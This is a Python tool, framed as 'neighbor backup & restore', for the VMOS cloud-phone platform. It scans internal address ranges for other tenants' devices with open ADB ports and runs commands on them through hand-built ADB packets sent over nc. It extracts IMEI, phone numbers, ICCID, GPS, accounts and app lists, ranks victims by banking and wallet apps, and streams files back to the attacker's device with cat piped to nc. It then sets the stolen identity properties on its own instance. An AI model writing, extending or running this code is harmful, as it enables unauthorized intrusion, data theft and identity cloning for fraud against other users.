#!/usr/bin/env python3
"""
One-Click Neighbor Backup & Restore
====================================
Discovers all VMOS neighbor devices, extracts maximum data from each,
and provides restore capability into our own device (D1).

Uses VMOS Cloud API syncCmd on D1 to relay commands to neighbors
via nc on port 5555 (ADB protocol over raw TCP).

Architecture:
  Local Machine → VMOS API (syncCmd) → D1 shell → nc → Neighbor ADB

Usage:
  python3 neighbor_backup_restore.py discover     # Find all neighbors
  python3 neighbor_backup_restore.py assess        # Score neighbors by value
  python3 neighbor_backup_restore.py backup <IP>   # Full backup of one neighbor
  python3 neighbor_backup_restore.py backup-all    # Backup ALL neighbors
  python3 neighbor_backup_restore.py restore <IP>  # Restore backup into D1
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import struct
import sys
import time
from datetime import datetime
from pathlib import Path

# Add core modules to path
sys.path.insert(0, str(Path(__file__).parent / "vmos_titan" / "core"))
from vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
D1_PAD = "ACP250923JS861KJ"

# Network ranges to scan (from previous scan data)
SCAN_RANGES = [
    ("10.0.96", 1, 254),    # Primary range (114+ devices found before)
    ("10.0.26", 1, 254),    # Secondary range (.220 was here)
]

BACKUP_DIR = Path(__file__).parent / "neighbor_backups"
REPORT_DIR = Path(__file__).parent / "reports"
CMD_DELAY = 3.5  # seconds between API calls (safety margin)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("backup")


# ═══════════════════════════════════════════════════════════════════════
# ADB WIRE PROTOCOL (minimal implementation)
# ═══════════════════════════════════════════════════════════════════════

ADB_CNXN = b"CNXN"
ADB_OPEN = b"OPEN"
ADB_OKAY = b"OKAY"
ADB_WRTE = b"WRTE"
ADB_CLSE = b"CLSE"
ADB_VERSION = 0x01000001
ADB_MAXDATA = 256 * 1024  # 256KB


def _adb_checksum(data: bytes) -> int:
    """Calculate ADB packet data checksum."""
    return sum(data) & 0xFFFFFFFF


def _adb_magic(cmd: bytes) -> int:
    """Calculate magic complement of command."""
    return struct.unpack("<I", cmd)[0] ^ 0xFFFFFFFF


def _build_adb_packet(cmd: bytes, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    """Build a single ADB wire protocol packet."""
    header = struct.pack("<4sIIII I",
                         cmd, arg0, arg1,
                         len(data), _adb_checksum(data),
                         _adb_magic(cmd))
    return header + data


def build_adb_cnxn() -> bytes:
    """Build CNXN (connection) packet."""
    banner = b"host::\x00"
    return _build_adb_packet(ADB_CNXN, ADB_VERSION, ADB_MAXDATA, banner)


def build_adb_open(local_id: int, service: str) -> bytes:
    """Build OPEN packet to open a service (e.g. 'shell:command')."""
    return _build_adb_packet(ADB_OPEN, local_id, 0, service.encode() + b"\x00")


def build_adb_okay(local_id: int, remote_id: int) -> bytes:
    """Build OKAY acknowledgement packet."""
    return _build_adb_packet(ADB_OKAY, local_id, remote_id)


def parse_adb_packets(raw: bytes) -> list:
    """Parse raw bytes into ADB packets."""
    packets = []
    pos = 0
    while pos + 24 <= len(raw):
        cmd = raw[pos:pos + 4]
        if cmd not in (ADB_CNXN, ADB_OPEN, ADB_OKAY, ADB_WRTE, ADB_CLSE):
            pos += 1
            continue
        arg0, arg1, length, checksum, magic = struct.unpack_from("<IIIII", raw, pos + 4)
        data_end = pos + 24 + length
        if data_end > len(raw):
            # Truncated packet — capture whatever data is available
            data = raw[pos + 24:]
            packets.append({
                "cmd": cmd.decode("ascii", errors="replace"),
                "arg0": arg0, "arg1": arg1,
                "data": data,
            })
            break
        data = raw[pos + 24:data_end]
        packets.append({
            "cmd": cmd.decode("ascii", errors="replace"),
            "arg0": arg0, "arg1": arg1,
            "data": data,
        })
        pos = data_end
    return packets


# ═══════════════════════════════════════════════════════════════════════
# VMOS API HELPERS
# ═══════════════════════════════════════════════════════════════════════

class D1Bridge:
    """Execute commands on D1 and relay to neighbors via VMOS Cloud API."""

    def __init__(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK)
        self.pad = D1_PAD
        self._last_cmd = 0.0

    async def _throttle(self):
        """Rate-limit API calls to avoid 110031 errors."""
        elapsed = time.time() - self._last_cmd
        if elapsed < CMD_DELAY:
            await asyncio.sleep(CMD_DELAY - elapsed)

    async def cmd(self, command: str, timeout: int = 30) -> str:
        """Execute shell command on D1 via syncCmd. Returns stdout."""
        await self._throttle()
        self._last_cmd = time.time()
        try:
            resp = await self.client.sync_cmd(self.pad, command, timeout_sec=timeout)
            if resp.get("code") != 200:
                log.warning("syncCmd error: code=%s msg=%s", resp.get("code"), resp.get("msg"))
                return ""
            data = resp.get("data")
            if isinstance(data, list) and data:
                val = data[0].get("errorMsg")
                return str(val).strip() if val is not None else ""
            elif isinstance(data, dict):
                val = data.get("errorMsg")
                return str(val).strip() if val is not None else ""
            return str(data).strip() if data else ""
        except Exception as e:
            log.error("syncCmd exception: %s", e)
            return ""

    async def enable_root(self) -> bool:
        """Enable global root on D1."""
        log.info("Enabling root on D1 (%s)...", self.pad)
        resp = await self.client.switch_root(
            [self.pad], enable=True, root_type=0
        )
        if resp.get("code") == 200:
            log.info("✓ Root enabled on D1")
            return True
        # Try per-app root for shell
        resp = await self.client.switch_root(
            [self.pad], enable=True, root_type=1, package_name="com.android.shell"
        )
        ok = resp.get("code") == 200
        log.info("Root enable (per-app shell): %s", "✓" if ok else "✗")
        return ok

    async def enable_adb(self) -> dict:
        """Enable ADB on D1 and return connection info."""
        log.info("Enabling ADB on D1...")
        resp = await self.client.enable_adb([self.pad], enable=True)
        await asyncio.sleep(3)
        info = await self.client.get_adb_info(self.pad, enable=True)
        return info.get("data", {})

    _cnxn_staged: dict = {}  # Cache: ip → True (CNXN already on D1)

    async def _ensure_cnxn(self, ip: str):
        """Stage CNXN packet on D1 (cached per IP, only pushed once)."""
        key = ip.replace(".", "_")
        if key not in self._cnxn_staged:
            b64 = base64.b64encode(build_adb_cnxn()).decode()
            await self.cmd(f"echo -n '{b64}' | base64 -d > /sdcard/.cnxn_{key}")
            self._cnxn_staged[key] = True

    async def neighbor_cmd(self, ip: str, shell_cmd: str, timeout: int = 5) -> str:
        """Execute a command on a neighbor device via ADB relay through D1.

        Proven method (verified on 10.0.26.220 — returned Pixel 9 model):
        1. Stage CNXN packet once per IP (cached)
        2. Stage OPEN packet with shell command
        3. Pipe through nc with 0.3s handshake delay
        4. Read response file (ALWAYS — relay syncCmd returns 110012 but nc
           still writes data to the file before timeout kills it)

        ~3 API calls per command (stage OPEN, relay, read+cleanup).
        """
        ip_key = ip.replace(".", "_")
        tag = f"{hash(shell_cmd) & 0xFFFF:04x}"

        # Stage CNXN (cached, usually 0 API calls)
        await self._ensure_cnxn(ip)

        # Stage OPEN packet
        open_pkt = build_adb_open(1, f"shell:{shell_cmd}")
        b64_open = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64_open}' | base64 -d > /sdcard/.o{tag}")

        # Execute relay via asyncCmd (fire-and-forget, no timeout kill)
        relay_cmd = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.o{tag}; sleep {timeout}) | "
            f"timeout {timeout + 2} nc {ip} 5555 > /sdcard/.r{tag} 2>/dev/null"
        )
        await self._throttle()
        self._last_cmd = time.time()
        try:
            await self.client.async_adb_cmd([self.pad], relay_cmd)
        except Exception:
            pass

        # Wait for relay to complete (CNXN handshake + command execution + output)
        await asyncio.sleep(timeout + 4)

        # Read response file (base64 direct output, no shell variable)
        b64_response = await self.cmd(
            f"base64 /sdcard/.r{tag} 2>/dev/null | tr -d '\\n'"
        )

        # Cleanup staged files
        await self.cmd(f"rm -f /sdcard/.o{tag} /sdcard/.r{tag}")

        if not b64_response:
            return ""

        try:
            # Pad base64 (syncCmd may truncate output at non-4 boundary)
            padded = b64_response + "=" * (-len(b64_response) % 4)
            raw = base64.b64decode(padded)
        except Exception as e:
            log.warning("base64 decode failed: %s (first 50: %s)", e, b64_response[:50])
            return ""

        packets = parse_adb_packets(raw)
        output_parts = []
        for pkt in packets:
            if pkt["cmd"] == "WRTE" and pkt["data"]:
                output_parts.append(pkt["data"].decode("utf-8", errors="replace"))

        return "".join(output_parts).strip()

    async def pull_file_from_neighbor(self, ip: str, remote_path: str,
                                       d1_dest: str, transfer_timeout: int = 60) -> int:
        """Pull a file from a neighbor device to D1 via direct nc pipe.

        Proven approach (verified 66MB APK, MD5 match):
          1. async_adb_cmd: nc listener on D1
          2. async_adb_cmd: ADB relay tells neighbor cat|nc to D1
          3. Fixed wait (no syncCmd during transfer!)
          4. syncCmd: check file size after wait

        IMPORTANT: Kill stale nc processes before each transfer to
        prevent accumulation that blocks syncCmd.

        Returns bytes received on D1 (0 = failed).
        """
        d1_ip = "10.0.96.174"
        port = 19870 + (hash(remote_path) & 0xFF)
        ip_key = ip.replace(".", "_")

        # Kill stale nc processes and clean up (CRITICAL for sequential transfers)
        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f {d1_dest} /sdcard/.xfer_open")

        # Stage ADB OPEN packet
        await self._ensure_cnxn(ip)
        shell_cmd = f"cat {remote_path} | nc -w 10 {d1_ip} {port}"
        open_pkt = build_adb_open(1, f"shell:{shell_cmd}")
        b64_open = base64.b64encode(open_pkt).decode()
        await self.cmd(f"echo -n '{b64_open}' | base64 -d > /sdcard/.xfer_open")

        # Step 1: Start nc listener via async_adb_cmd (survives indefinitely)
        await self._throttle()
        self._last_cmd = time.time()
        try:
            await self.client.async_adb_cmd([self.pad], f"nc -l -p {port} > {d1_dest}")
        except Exception:
            pass
        await asyncio.sleep(2)

        # Step 2: Fire ADB relay via async_adb_cmd
        relay_cmd = (
            f"(cat /sdcard/.cnxn_{ip_key}; sleep 0.3; cat /sdcard/.xfer_open; "
            f"sleep {transfer_timeout}) | "
            f"timeout {transfer_timeout + 5} nc {ip} 5555 > /dev/null 2>&1"
        )
        await self._throttle()
        self._last_cmd = time.time()
        try:
            await self.client.async_adb_cmd([self.pad], relay_cmd)
        except Exception:
            pass

        # Step 3: FIXED WAIT — do NOT call syncCmd during transfer!
        await asyncio.sleep(transfer_timeout + 5)

        # Step 4: Check file size (async processes should be done now)
        size_str = await self.cmd(f"wc -c < {d1_dest} 2>/dev/null || echo 0")
        try:
            size = int(size_str.strip())
        except ValueError:
            size = 0

        # Cleanup nc processes for this port
        await self.cmd(f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /sdcard/.xfer_open")

        return size


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: DISCOVERY
# ═══════════════════════════════════════════════════════════════════════

async def discover_neighbors(bridge: D1Bridge) -> list[dict]:
    """Scan network for live neighbor devices."""
    log.info("=" * 60)
    log.info("PHASE 1: NEIGHBOR DISCOVERY")
    log.info("=" * 60)

    all_live = []

    for prefix, start, end in SCAN_RANGES:
        log.info("Scanning %s.%d-%d ...", prefix, start, end)

        # Batch ping scan using parallel nc (scan 50 at a time)
        batch_size = 50
        for batch_start in range(start, end + 1, batch_size):
            batch_end = min(batch_start + batch_size - 1, end)
            scan_cmd = (
                f"for i in $(seq {batch_start} {batch_end}); do "
                f"(nc -z -w 1 {prefix}.$i 5555 2>/dev/null && echo \"{prefix}.$i\") & "
                f"done; wait"
            )
            result = await bridge.cmd(scan_cmd, timeout=30)

            if result:
                for line in result.strip().split("\n"):
                    ip = line.strip()
                    if ip and ip.startswith("10."):
                        all_live.append({"ip": ip, "port": 5555})
                        log.info("  ✓ LIVE: %s:5555", ip)

    log.info("Discovery complete: %d live neighbors found", len(all_live))
    return all_live


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: ASSESSMENT (score neighbors by value)
# ═══════════════════════════════════════════════════════════════════════

async def assess_neighbor(bridge: D1Bridge, ip: str) -> dict:
    """Extract identity and assess value of a single neighbor.

    Optimized: combines all identity props into ONE relay call (~12s)
    and packages+accounts into a SECOND relay call (~12s).
    Total: ~24s per neighbor instead of ~120s (10 separate calls).
    """
    info = {"ip": ip, "score": 0, "identity": {}, "apps": [], "errors": []}

    log.info("  Assessing %s ...", ip)

    # ─── Single combined identity command ─────────────────────────
    id_keys = ["model", "brand", "android_id", "imei", "phone", "gps_lat", "gps_lon", "iccid"]
    combined_id_cmd = (
        "echo MODEL=$(getprop ro.product.model);"
        "echo BRAND=$(getprop ro.product.brand);"
        "echo ANDROIDID=$(settings get secure android_id 2>/dev/null);"
        "echo IMEI=$(getprop persist.sys.cloud.imeinum);"
        "echo PHONE=$(getprop persist.sys.cloud.phonenum);"
        "echo GPSLAT=$(getprop persist.sys.cloud.gps.lat);"
        "echo GPSLON=$(getprop persist.sys.cloud.gps.lon);"
        "echo ICCID=$(getprop persist.sys.cloud.iccidnum)"
    )
    tag_map = {"MODEL": "model", "BRAND": "brand", "ANDROIDID": "android_id",
               "IMEI": "imei", "PHONE": "phone", "GPSLAT": "gps_lat",
               "GPSLON": "gps_lon", "ICCID": "iccid"}
    try:
        id_output = await bridge.neighbor_cmd(ip, combined_id_cmd)
        if id_output:
            for line in id_output.split("\n"):
                if "=" in line:
                    tag, _, val = line.partition("=")
                    tag = tag.strip()
                    val = val.strip()
                    key = tag_map.get(tag)
                    if key and val and val != "null":
                        info["identity"][key] = val
                        info["score"] += 10
    except Exception as e:
        info["errors"].append(f"identity: {e}")

    # ─── Combined packages + accounts in one call ─────────────────
    try:
        combo_output = await bridge.neighbor_cmd(
            ip,
            "echo '---PKGS---'; pm list packages -3 2>/dev/null | head -50;"
            "echo '---ACCTS---'; cmd account list 2>/dev/null | head -20"
        )
        if combo_output:
            pkg_section = ""
            acct_section = ""
            if "---PKGS---" in combo_output and "---ACCTS---" in combo_output:
                parts = combo_output.split("---ACCTS---")
                pkg_section = parts[0].split("---PKGS---", 1)[-1] if "---PKGS---" in parts[0] else ""
                acct_section = parts[1] if len(parts) > 1 else ""
            elif "---PKGS---" in combo_output:
                pkg_section = combo_output.split("---PKGS---", 1)[-1]

            # Parse packages
            if pkg_section:
                pkgs = [l.replace("package:", "").strip()
                        for l in pkg_section.split("\n") if l.strip().startswith("package:")]
                info["apps"] = pkgs
                info["score"] += len(pkgs) * 5

                finance_keywords = ["bank", "pay", "wallet", "money", "finance", "ozon", "yandex"]
                for pkg in pkgs:
                    if any(kw in pkg.lower() for kw in finance_keywords):
                        info["score"] += 50

            # Parse accounts
            if acct_section:
                info["identity"]["accounts_raw"] = acct_section.strip()
                if "Account" in acct_section:
                    info["score"] += 30
    except Exception as e:
        info["errors"].append(f"packages/accounts: {e}")

    log.info("  %s → score=%d model=%s brand=%s apps=%d",
             ip, info["score"],
             info["identity"].get("model", "?"),
             info["identity"].get("brand", "?"),
             len(info["apps"]))

    return info


async def assess_all(bridge: D1Bridge, neighbors: list[dict]) -> list[dict]:
    """Assess all neighbors and rank by value."""
    log.info("=" * 60)
    log.info("PHASE 2: NEIGHBOR ASSESSMENT (%d devices)", len(neighbors))
    log.info("=" * 60)

    assessed = []
    for i, n in enumerate(neighbors):
        log.info("[%d/%d] Assessing %s", i + 1, len(neighbors), n["ip"])
        info = await assess_neighbor(bridge, n["ip"])
        assessed.append(info)

    # Sort by score (highest first)
    assessed.sort(key=lambda x: x["score"], reverse=True)

    log.info("\n" + "=" * 60)
    log.info("TOP 10 HIGH-VALUE NEIGHBORS:")
    log.info("=" * 60)
    for i, n in enumerate(assessed[:10]):
        log.info("  #%d  %s  score=%d  model=%s  apps=%d",
                 i + 1, n["ip"], n["score"],
                 n["identity"].get("model", "?"), len(n["apps"]))

    return assessed


# ═══════════════════════════════════════════════════════════════════════
# PHASE 3: FULL BACKUP
# ═══════════════════════════════════════════════════════════════════════

async def full_backup(bridge: D1Bridge, ip: str) -> dict:
    """Complete backup of a single neighbor device."""
    log.info("=" * 60)
    log.info("PHASE 3: FULL BACKUP OF %s", ip)
    log.info("=" * 60)

    backup = {
        "ip": ip,
        "timestamp": datetime.utcnow().isoformat(),
        "identity": {},
        "properties": {},
        "apps": [],
        "app_data": {},
        "accounts": "",
        "sdcard_listing": "",
        "bu_backups": {},
        "status": "in_progress",
    }

    backup_path = BACKUP_DIR / ip.replace(".", "_")
    backup_path.mkdir(parents=True, exist_ok=True)

    # ─── 3.1: Full Property Dump ────────────────────────────────
    log.info("[3.1] Extracting full property dump...")
    props_raw = await bridge.neighbor_cmd(ip, "getprop 2>/dev/null | head -200")
    if props_raw:
        backup["properties"]["raw"] = props_raw
        (backup_path / "getprop.txt").write_text(props_raw)
        log.info("  ✓ Properties: %d lines", len(props_raw.split("\n")))

    # ─── 3.2: Cloud Identity Properties ─────────────────────────
    log.info("[3.2] Extracting cloud identity...")
    cloud_props = [
        "persist.sys.cloud.imeinum", "persist.sys.cloud.imsinum",
        "persist.sys.cloud.iccidnum", "persist.sys.cloud.phonenum",
        "persist.sys.cloud.macaddress", "persist.sys.cloud.gps.lat",
        "persist.sys.cloud.gps.lon", "persist.sys.cloud.drm.id",
        "persist.sys.cloud.drm.puid", "ro.sys.cloud.android_id",
        "persist.sys.cloud.wifi.ssid", "persist.sys.cloud.wifi.mac",
        "persist.sys.cloud.wifi.ip", "persist.sys.cloud.wifi.gateway",
        "persist.sys.cloud.wifi.dns1",
        "persist.sys.cloud.gpu.gl_vendor", "persist.sys.cloud.gpu.gl_renderer",
        "persist.sys.cloud.battery.capacity", "persist.sys.cloud.battery.level",
        "ro.product.model", "ro.product.brand", "ro.product.manufacturer",
        "ro.product.device", "ro.product.name", "ro.product.board",
        "ro.build.fingerprint", "ro.build.display.id",
        "ro.serialno", "ro.hardware",
    ]
    # Batch extract (combine into single command to save API calls)
    prop_cmd = "; ".join([f'echo "{p}=$(getprop {p})"' for p in cloud_props])
    prop_result = await bridge.neighbor_cmd(ip, prop_cmd)
    if prop_result:
        for line in prop_result.split("\n"):
            if "=" in line:
                key, _, val = line.partition("=")
                key = key.strip()
                val = val.strip()
                if val and val != "null":
                    backup["identity"][key] = val
        (backup_path / "identity.json").write_text(
            json.dumps(backup["identity"], indent=2))
        log.info("  ✓ Identity: %d properties", len(backup["identity"]))

    # ─── 3.3: Android ID & Settings ─────────────────────────────
    log.info("[3.3] Extracting Android settings...")
    settings_cmd = (
        "settings get secure android_id; "
        "settings get secure bluetooth_address; "
        "settings get global device_name"
    )
    settings_result = await bridge.neighbor_cmd(ip, settings_cmd)
    if settings_result:
        backup["identity"]["settings_raw"] = settings_result
        log.info("  ✓ Settings extracted")

    # ─── 3.4: Installed Apps ────────────────────────────────────
    log.info("[3.4] Extracting installed apps list...")
    pkg_result = await bridge.neighbor_cmd(ip, "pm list packages -3 -f 2>/dev/null")
    if pkg_result:
        apps = []
        for line in pkg_result.split("\n"):
            if line.startswith("package:"):
                # Format: package:/data/app/.../base.apk=com.example.app
                parts = line[8:].rsplit("=", 1)
                if len(parts) == 2:
                    apps.append({"path": parts[0], "package": parts[1].strip()})
        backup["apps"] = apps
        (backup_path / "apps.json").write_text(json.dumps(apps, indent=2))
        log.info("  ✓ Apps: %d third-party packages", len(apps))

    # ─── 3.5: Account List ──────────────────────────────────────
    log.info("[3.5] Extracting account list...")
    acct_result = await bridge.neighbor_cmd(ip, "dumpsys account 2>/dev/null | head -100", timeout=15)
    if acct_result:
        backup["accounts"] = acct_result
        (backup_path / "accounts.txt").write_text(acct_result)
        log.info("  ✓ Accounts: %d lines", len(acct_result.split("\n")))

    # ─── 3.6: sdcard Listing ────────────────────────────────────
    log.info("[3.6] Extracting sdcard listing...")
    sdcard_result = await bridge.neighbor_cmd(ip, "ls -laR /sdcard/ 2>/dev/null | head -200", timeout=15)
    if sdcard_result:
        backup["sdcard_listing"] = sdcard_result
        (backup_path / "sdcard_listing.txt").write_text(sdcard_result)
        log.info("  ✓ sdcard: %d lines", len(sdcard_result.split("\n")))

    # ─── 3.7: APK Extraction via D1 relay ───────────────────────
    log.info("[3.7] Extracting APKs via D1 relay...")
    apk_dir = backup_path / "apks"
    apk_dir.mkdir(exist_ok=True)

    for i, app in enumerate(backup["apps"][:20]):  # Limit to top 20 for speed
        pkg = app["package"]
        apk_path = app["path"]
        log.info("  [%d/%d] Pulling APK: %s", i + 1, min(len(backup["apps"]), 20), pkg)

        # Copy APK to neighbor's sdcard, then relay via D1
        # Step 1: On neighbor, copy APK to accessible location
        copy_cmd = f"cp {apk_path} /sdcard/{pkg}.apk 2>/dev/null && ls -la /sdcard/{pkg}.apk"
        copy_result = await bridge.neighbor_cmd(ip, copy_cmd, timeout=15)

        if not copy_result or "No such file" in copy_result:
            log.warning("    ✗ Cannot copy %s", pkg)
            continue

        # Step 2: On D1, pull from neighbor via nc and store on D1's sdcard
        # Use nc to stream the APK from neighbor to D1
        pull_cmd = (
            f"nc -w 10 {ip} 5555 < /dev/null > /dev/null 2>&1; "  # Connection test
            f"echo 'APK relay requires ADB tunnel - staging for later'"
        )
        # Note: Full APK binary transfer requires ADB tunnel, not syncCmd
        # Stage the extraction commands for when ADB tunnel is available
        backup["app_data"][pkg] = {
            "apk_path": apk_path,
            "status": "staged_for_adb_extraction",
        }

    # ─── 3.8: bu backup (per-app) ──────────────────────────────
    log.info("[3.8] Attempting bu backup for key apps...")
    finance_apps = [a for a in backup["apps"]
                    if any(kw in a["package"].lower()
                           for kw in ["bank", "pay", "wallet", "money", "ozon", "yandex"])]

    for app in finance_apps[:5]:
        pkg = app["package"]
        log.info("  bu backup: %s", pkg)
        bu_result = await bridge.neighbor_cmd(
            ip,
            f"bu backup {pkg} 2>&1 | wc -c",
            timeout=20,
        )
        backup["bu_backups"][pkg] = bu_result or "failed"
        log.info("    → %s", bu_result or "empty/failed")

    # ─── Save backup manifest ───────────────────────────────────
    backup["status"] = "complete"
    manifest_path = backup_path / "manifest.json"
    manifest_path.write_text(json.dumps(backup, indent=2, default=str))
    log.info("\n✓ BACKUP COMPLETE → %s", backup_path)
    log.info("  Identity: %d props | Apps: %d | Accounts: %s",
             len(backup["identity"]), len(backup["apps"]),
             "extracted" if backup["accounts"] else "none")

    return backup


# ═══════════════════════════════════════════════════════════════════════
# PHASE 4: RESTORE INTO D1
# ═══════════════════════════════════════════════════════════════════════

async def restore_to_d1(bridge: D1Bridge, backup_ip: str) -> dict:
    """Restore a neighbor backup into D1."""
    log.info("=" * 60)
    log.info("PHASE 4: RESTORE %s → D1 (%s)", backup_ip, D1_PAD)
    log.info("=" * 60)

    backup_path = BACKUP_DIR / backup_ip.replace(".", "_")
    manifest_path = backup_path / "manifest.json"

    if not manifest_path.exists():
        log.error("No backup found for %s at %s", backup_ip, backup_path)
        return {"error": "no_backup"}

    backup = json.loads(manifest_path.read_text())
    result = {"status": "in_progress", "steps": {}}

    # ─── 4.1: Restore Identity (Device Properties) ──────────────
    log.info("[4.1] Restoring device identity...")
    identity = backup.get("identity", {})

    # Split properties: persist.* via setprop (instant), ro.* via API (reboot)
    persist_props = {}
    ro_props = {}
    for key, val in identity.items():
        if key == "settings_raw":
            continue
        if key.startswith("persist.sys.cloud.") or key.startswith("persist."):
            persist_props[key] = val
        elif key.startswith("ro."):
            ro_props[key] = val

    # Phase A: Set persist.* properties via shell setprop (instant, no reboot)
    set_count = 0
    if persist_props:
        log.info("  Setting %d persist.* properties via setprop...", len(persist_props))
        # Batch into groups of 5 to minimize API calls
        items = list(persist_props.items())
        for i in range(0, len(items), 5):
            batch = items[i:i + 5]
            cmd_parts = [f"setprop {k} '{v}'" for k, v in batch]
            await bridge.cmd(" && ".join(cmd_parts))
            set_count += len(batch)
        log.info("  ✓ %d persist.* properties set", set_count)

    # Phase B: ro.* properties (model, brand, fingerprint)
    # NOTE: VMOS updatePadAndroidProp API accepts these but does NOT apply them
    # on real-device instances. This is a known platform limitation.
    # The persist.sys.cloud.* properties (IMEI, phone, GPS, WiFi, etc.) are the
    # critical fingerprinting properties and ARE restored via setprop above.
    if ro_props:
        log.info("  ⚠ %d ro.* properties skipped (platform limitation — cannot change ro.* on real devices)", len(ro_props))
        log.info("    Backed up for reference: %s", ", ".join(f"{k}={v}" for k, v in list(ro_props.items())[:3]))

    result["steps"]["identity"] = f"{set_count} persist props set, {len(ro_props)} ro props (read-only)"

    # ─── 4.2: Install Apps ──────────────────────────────────────
    log.info("[4.2] Installing apps...")
    apps = backup.get("apps", [])
    installed = 0
    for app in apps:
        pkg = app["package"]
        apk_local = backup_path / "apks" / f"{pkg}.apk"
        if apk_local.exists():
            # Push APK to D1's sdcard, then install
            log.info("  Installing %s ...", pkg)
            # Read APK, push via Bridge Protocol (chunked base64)
            apk_bytes = apk_local.read_bytes()
            b64_data = base64.b64encode(apk_bytes).decode()

            # Push in chunks to D1
            remote_apk = f"/sdcard/{pkg}.apk"
            chunk_size = 3072  # ~4KB base64
            chunks = [b64_data[i:i + chunk_size] for i in range(0, len(b64_data), chunk_size)]

            log.info("    Pushing %d chunks (%d bytes)...", len(chunks), len(apk_bytes))
            success = True
            for ci, chunk in enumerate(chunks):
                op = ">" if ci == 0 else ">>"
                push_result = await bridge.cmd(
                    f"echo -n '{chunk}' {op} {remote_apk}.b64"
                )
                if ci % 50 == 0:
                    log.info("    Chunk %d/%d", ci, len(chunks))

            # Decode and install
            await bridge.cmd(f"base64 -d {remote_apk}.b64 > {remote_apk} && rm {remote_apk}.b64")
            install_result = await bridge.cmd(
                f"pm install -r {remote_apk} 2>&1", timeout=60
            )
            if "Success" in install_result:
                installed += 1
                log.info("    ✓ Installed %s", pkg)
            else:
                log.warning("    ✗ Install failed: %s", install_result[:100])

            # Cleanup
            await bridge.cmd(f"rm -f {remote_apk}")
        else:
            log.info("  ⊘ No APK file for %s (staged for ADB extraction)", pkg)

    result["steps"]["apps"] = f"{installed}/{len(apps)} installed"

    # ─── 4.3: Restore GPS ───────────────────────────────────────
    log.info("[4.3] Restoring GPS location...")
    lat = identity.get("persist.sys.cloud.gps.lat")
    lon = identity.get("persist.sys.cloud.gps.lon")
    if lat and lon:
        try:
            resp = await bridge.client.set_gps(
                [D1_PAD], lat=float(lat), lng=float(lon)
            )
            ok = resp.get("code") == 200
            result["steps"]["gps"] = f"ok ({lat}, {lon})" if ok else "failed"
            log.info("  %s GPS: %s, %s", "✓" if ok else "✗", lat, lon)
        except Exception as e:
            result["steps"]["gps"] = f"error: {e}"
    else:
        result["steps"]["gps"] = "skipped_no_coords"

    # ─── 4.4: Summary ──────────────────────────────────────────
    result["status"] = "complete"
    result_path = backup_path / "restore_result.json"
    result_path.write_text(json.dumps(result, indent=2))

    log.info("\n" + "=" * 60)
    log.info("RESTORE COMPLETE: %s → D1", backup_ip)
    for step, status in result["steps"].items():
        log.info("  %s: %s", step, status)
    log.info("=" * 60)

    return result


# ═══════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════

async def main():
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    REPORT_DIR.mkdir(parents=True, exist_ok=True)

    bridge = D1Bridge()

    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    action = sys.argv[1].lower()

    # ─── Setup: Enable root on D1 ──────────────────────────────
    log.info("Setting up D1...")
    await bridge.enable_root()
    await asyncio.sleep(3)

    # Verify D1 is alive
    whoami = await bridge.cmd("whoami")
    log.info("D1 whoami: %s", whoami)

    if action == "discover":
        # ─── Discover all neighbors ────────────────────────────
        neighbors = await discover_neighbors(bridge)
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "count": len(neighbors),
            "neighbors": neighbors,
        }
        report_path = REPORT_DIR / f"neighbor_discovery_{int(time.time())}.json"
        report_path.write_text(json.dumps(report, indent=2))
        log.info("Report saved: %s", report_path)

    elif action == "assess":
        # ─── Discover + assess all ─────────────────────────────
        neighbors = await discover_neighbors(bridge)
        assessed = await assess_all(bridge, neighbors)
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "count": len(assessed),
            "top_targets": assessed[:20],
            "all": assessed,
        }
        report_path = REPORT_DIR / f"neighbor_assessment_{int(time.time())}.json"
        report_path.write_text(json.dumps(report, indent=2, default=str))
        log.info("Assessment saved: %s", report_path)

    elif action == "backup" and len(sys.argv) >= 3:
        # ─── Full backup of specific neighbor ──────────────────
        target_ip = sys.argv[2]
        backup = await full_backup(bridge, target_ip)

    elif action == "backup-all":
        # ─── Backup ALL neighbors ──────────────────────────────
        neighbors = await discover_neighbors(bridge)
        assessed = await assess_all(bridge, neighbors)
        log.info("\nStarting bulk backup of %d neighbors...", len(assessed))
        for i, n in enumerate(assessed):
            log.info("\n[BULK %d/%d] Backing up %s (score=%d)",
                     i + 1, len(assessed), n["ip"], n["score"])
            try:
                await full_backup(bridge, n["ip"])
            except Exception as e:
                log.error("Backup failed for %s: %s", n["ip"], e)

    elif action == "restore" and len(sys.argv) >= 3:
        # ─── Restore specific backup into D1 ───────────────────
        target_ip = sys.argv[2]
        result = await restore_to_d1(bridge, target_ip)

    elif action == "oneclick":
        # ─── ONE-CLICK: discover → assess → backup best → restore ──
        log.info("🚀 ONE-CLICK MODE: Full pipeline")

        # Step 1: Discover
        neighbors = await discover_neighbors(bridge)
        if not neighbors:
            log.error("No neighbors found!")
            return

        # Step 2: Assess top candidates
        # Assess first 20 for speed, or all if fewer
        to_assess = neighbors[:20] if len(neighbors) > 20 else neighbors
        assessed = await assess_all(bridge, to_assess)

        if not assessed or assessed[0]["score"] == 0:
            log.error("No assessable neighbors!")
            return

        # Step 3: Backup the highest-value neighbor
        best = assessed[0]
        log.info("\n🎯 Best target: %s (score=%d, model=%s, apps=%d)",
                 best["ip"], best["score"],
                 best["identity"].get("model", "?"), len(best["apps"]))

        backup = await full_backup(bridge, best["ip"])

